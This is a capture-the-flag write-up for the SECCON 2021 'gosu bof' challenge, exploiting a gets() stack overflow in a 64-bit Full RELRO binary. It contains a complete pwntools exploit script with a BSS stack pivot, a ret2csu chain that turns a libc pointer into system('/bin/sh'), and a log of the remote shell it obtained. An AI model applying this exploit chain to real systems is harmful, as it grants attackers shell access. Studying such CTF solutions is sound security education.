# SECCON CTF 2021

## gosu bof

> 248
> 
> Just changed from 32-bit to 64-bit. That's it.
> 
> `nc hiyoko.quals.seccon.jp 9002`
>
> Author: ptr-yudai
> 
> [`gosu_bof.tar.gz`](gosu_bof.tar.gz)

Tags: _pwn_ _x86-64_ _bof_ _remote-shell_ _rop_ _ret2csu_ _stack-pivot_


## Summary

_Just changed from 32-bit to 64-bit. That's it._

That's a lie.  There was one other change--compiling with Full RELRO.

Everything else is the same.  We're still blind, all we have to work with is `gets` and ROP.  At least libc was provided.

I worked on two solutions; brute force with `one_gadget`, but I got bored waiting, so I started on a second solution that did not require brute force.  That is the solution outlined here.

> If you haven't already, read [kasu](../kasu) first.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

At least three conditions must be met for _ret2dlresolve_, No PIE (or a base process leak), No canary (or a canary leak, or some other way to write down stack), and Partial RELRO.

Well, we have Full RELRO.  So no easy shell with _ret2dlresolve_.


### Decompile with Ghidra

```c
undefined8 main(void)
{
  char local_88 [128];
  
  gets(local_88);
  return 0;
}
```

This is nearly identical to [kasu](../kasu).  `gets` is still the vulnerability.

Since there's nothing else in the GOT like `puts`, `printf`, `write`, etc... to leak any information, we're going to have to do this blind (with math).

#### Let's go shopping...

The two ROP gadgets that stood out were:

```
0x00000000004011bd: pop rsp; pop r13; pop r14; pop r15; ret;
```

and

```
0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
```

> BTW, the second gadget was only emitted by `ROPgadget`!  `ropper` failed to find that gadget.  Lesson learned, use all your toys.

The `pop rsp` gadget will permit an easy stack pivot to the BSS, which is known thanks to _No PIE_.  This will allow the direct addressing of anything on the stack.  We will not need to leak the stack, since we own the entire stack.

The second gadget with the help from the tail end of `__libc_csu_init` enables us to _update_ the last 32-bits of any value we have the location of, and since we own the stack, we have all the locations we need.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./gosu')
libc = ELF('./libc-2.31.so')

if args.REMOTE:
    p = remote('hiyoko.quals.seccon.jp', 9002)
else:
    p = process(binary.path)
```

Standard pwntools header.

```python
new_stack = (binary.bss() & 0xfff000) + 0xf00
pop_rdi = binary.search(asm('pop rdi; ret')).__next__()
pop_rsp_r13_r14_r15 = binary.search(asm('pop rsp; pop r13; pop r14; pop r15; ret')).__next__()

payload  = b''
payload += 0x88 * b'A'
payload += p64(pop_rdi)
payload += p64(new_stack)
payload += p64(binary.plt.gets)
payload += p64(pop_rsp_r13_r14_r15)
payload += p64(new_stack)

p.sendline(payload)
```

The above defines our new stack at the end of the BSS page.  But not at the very end.  Since we're smashing the stack, we need a bit of headroom just in case (when you're going _down stack_, you're actually going _up_ in memory).

Our ROP chain simply calls `gets` with the location of our new stack, then pivots to that stack with `pop rsp`.

```python
# let's start over with a new stack
payload  = b''
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(binary.sym._start)

p.sendline(payload)

if args.REMOTE: time.sleep(0.1) # give some time to start up :-)
```

At this point in the execution [first] `gets` is waiting for input.  The above will populate our new stack so that the three `pop`s from the `pop rsp` gadget have something to `pop` before the return to `_start`, to well, _start_ over; however this time, we know the location of the stack, since we defined it.

> The last line is something I had to add when running remotely, basically, a bit of restart time.

This is a good time to set a breakpoint at the end of `main` to better understand how our final payload needs to be crafted:

```
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401136 <+0>:	endbr64
   0x000000000040113a <+4>:	push   rbp
   0x000000000040113b <+5>:	mov    rbp,rsp
   0x000000000040113e <+8>:	add    rsp,0xffffffffffffff80
   0x0000000000401142 <+12>:	lea    rax,[rbp-0x80]
   0x0000000000401146 <+16>:	mov    rdi,rax
   0x0000000000401149 <+19>:	mov    eax,0x0
   0x000000000040114e <+24>:	call   0x401040 <gets@plt>
   0x0000000000401153 <+29>:	mov    eax,0x0
   0x0000000000401158 <+34>:	leave
   0x0000000000401159 <+35>:	ret
End of assembler dump.
gef➤  b *main+34
Breakpoint 1 at 0x401158
```

Stack dump at break:

```
0x404d50:	0x00007fda4f1e5980	0x00007fda4f1e6790
0x404d60:	0x0000000000000000	0x0000000000000000
0x404d70:	0x0000000000000000	0x00007fda4f080c2e
0x404d80:	0x0000000000000000	0x0000000000401160
0x404d90:	0x0000000000404e30	0x0000000000401050
0x404da0:	0x0000000000000000	0x0000000000401153
0x404db0:	0x4141414141414141	0x4141414141414141
0x404dc0:	0x4141414141414141	0x4141414141414141
0x404dd0:	0x4141414141414141	0x4141414141414141
0x404de0:	0x4141414141414141	0x4141414141414141
0x404df0:	0x4141414141414141	0x4141414141414141
0x404e00:	0x4141414141414141	0x4141414141414141
0x404e10:	0x4141414141414141	0x4141414141414141
0x404e20:	0x4141414141414141	0x4141414141414141
0x404e30:	0x4141414141414141	0x00000000004011ba
0x404e40:	0x00000000ffe69a90	0x0000000000404d8d
0x404e50:	0x0000000000000000	0x0000000000000000
0x404e60:	0x0000000000000000	0x0000000000000000
0x404e70:	0x000000000040111c	0x00000000004011c4
0x404e80:	0x00000000004011ba	0x0000000000000000
0x404e90:	0x0000000000000001	0x0000000000404ec0
0x404ea0:	0x0000000000000000	0x0000000000000000
0x404eb0:	0x0000000000404d50	0x00000000004011a0
0x404ec0:	0x0068732f6e69622f	0x0000000000000000
0x404ed0:	0x0000000000000000	0x0000000000401160
0x404ee0:	0x0000000000000000	0x0000000000401050
0x404ef0:	0x0000000000000000	0x0000000000000000
0x404f00:	0x0000000000000000	0x000000000040107e
0x404f10:	0x0000000000404f18	0x0000000000404f00
```

At the top notice some interesting looking addresses.  We know they're not stack or base process addresses, both of those are known.  They must be libc.

The first address is `0x404d50: 0x00007fda4f1e5980`; invoking `info symbol` we get:

```
gef➤  i sym 0x00007fda4f1e5980
_IO_2_1_stdin_ in section .data of /lib/x86_64-linux-gnu/libc.so.6
```

Well that was easy.  We can just ignore the rest.  We need to change that to `system`:

```
gef➤  p/x &system
$1 = 0x7fda4f04f410
```

The location of `system` is below `_IO_2_1_stdin_`; we'll have to subtract off the difference, and that is where our second gadget comes in with some help from `__libc_csu_init`:

```python
'''
  4011a0:   4c 89 f2                mov    rdx,r14
  4011a3:   4c 89 ee                mov    rsi,r13
  4011a6:   44 89 e7                mov    edi,r12d
  4011a9:   41 ff 14 df             call   QWORD PTR [r15+rbx*8]
  4011ad:   48 83 c3 01             add    rbx,0x1
  4011b1:   48 39 dd                cmp    rbp,rbx
  4011b4:   75 ea                   jne    4011a0 <__libc_csu_init+0x40>
  4011b6:   48 83 c4 08             add    rsp,0x8
  4011ba:   5b                      pop    rbx
  4011bb:   5d                      pop    rbp
  4011bc:   41 5c                   pop    r12
  4011be:   41 5d                   pop    r13
  4011c0:   41 5e                   pop    r14
  4011c2:   41 5f                   pop    r15
  4011c4:   c3                      ret
'''

set_rdx_rsi_rdi_call_r15 = 0x4011a0
add_dword_ptr_rbp_ebx = binary.search(asm('add dword ptr [rbp - 0x3d], ebx; nop; ret')).__next__()
pop_rbx_rbp_r12_r13_r14_r15 = binary.search(asm('pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret')).__next__()
```

Above is the section of `__libc_csu_init` from `gosu`.  Next we setup some friendly names for our gadgets for use with our final payload:

```python
payload  = b''
payload += 0x88 * b'A'
payload += p64(pop_rbx_rbp_r12_r13_r14_r15)
payload += p64((libc.sym.system - libc.sym._IO_2_1_stdin_) & (1 << 32) - 1)
payload += p64(new_stack - 0x1b0 + 0x3d)
payload += 4 * p64(0)
payload += p64(add_dword_ptr_rbp_ebx)
payload += p64(pop_rdi+1) # align stack for system
payload += p64(pop_rbx_rbp_r12_r13_r14_r15)
payload += p64(0) # rbx
payload += p64(1) # rbp to get pass check, but not needed here, just habit
payload += p64(new_stack - 0x40) # r12/rdi /bin/sh downstack
payload += p64(0) # r13/rsi
payload += p64(0) # r14/rdx
payload += p64(new_stack - 0x1b0) # r15 pointer to function (system)
payload += p64(set_rdx_rsi_rdi_call_r15)
payload += b'/bin/sh' # \0 from gets for free, gets just keeps on giving

p.sendline(payload)
p.interactive()
```

From the top down:

Using the _pop sled_ at the end of `__libc_csu_init` we populate `rbx` and `rbp` for use with the `add dword ptr [rbp - 0x3d], ebx; nop; ret` gadget.  Since we have to reduce `_IO_2_1_stdin_` (`p64` does not do this for us for free) we'll have to compute the two's complement so that the `add` will be adding a negative number.  The location (`rbp - 0x3d`) is `0x404d50 + 0x3d` (see above for the `0x404d50`), however I used the offset relative to `new_stack` (this was helpful since `system` needed a lot more stack space than I originally started with).

With `0x404d50` now set to the location of `system`, then rest is just `ret2csu` with `/bin/sh` tailed on to the end.

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/seccon2021/gosu/gosu'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/pwd/datajerk/seccon2021/gosu/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to hiyoko.quals.seccon.jp on port 9002: Done
[*] Switching to interactive mode
$ id
uid=999(pwn) gid=999(pwn) groups=999(pwn)
$ cat flag*
SECCON{Return-Oriented-Professional_:clap:}
```
